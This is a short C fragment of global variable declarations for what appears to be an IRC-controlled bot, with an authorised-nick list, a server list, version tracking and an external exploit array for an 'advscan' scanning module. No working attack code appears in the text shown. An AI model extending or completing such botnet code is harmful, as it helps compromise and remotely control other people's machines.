// main irc structure
IRC mainirc;

// threads structure
THREAD threads[MAXTHREADS]; 

// aliases structure
ALIAS aliases[MAXALIASES];
int anum = MAXALIASES;

// array sizes
int authsize = (sizeof(authnick) / sizeof(authnick[0])-1);
int versionsize = (sizeof(versionlist) / sizeof(versionlist[0])-1);
int serversize = (sizeof(servers) / sizeof(servers[0])-1);

// misc.
bool success = false;   // if true then we made successful connect attempt
DWORD started;          // time bot was started
int current_version=0;  // current bot version (from versionlist)

// advscan
extern EXPLOIT exploit[];
